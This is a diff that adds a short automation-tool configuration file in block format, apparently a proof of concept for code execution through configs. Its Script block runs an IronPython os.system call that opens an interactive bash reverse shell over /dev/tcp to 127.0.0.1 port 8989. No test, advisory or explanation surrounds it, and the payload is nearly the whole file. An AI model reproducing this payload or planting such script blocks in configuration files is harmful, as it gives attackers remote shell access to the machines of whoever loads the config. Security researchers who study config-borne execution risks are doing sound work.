@@ -1,0 +1,16 @@
+
+BLOCK:ConstantString
+  value = "aaaa"
+  => VAR @test
+ENDBLOCK
+
+BLOCK:Script
+INTERPRETER:IronPython
+INPUT test
+BEGIN SCRIPT
+import os
+os.system("bash -i >& /dev/tcp/127.0.0.1/8989 0>&1")
+
+END SCRIPT
+OUTPUT String @test
+ENDBLOCK
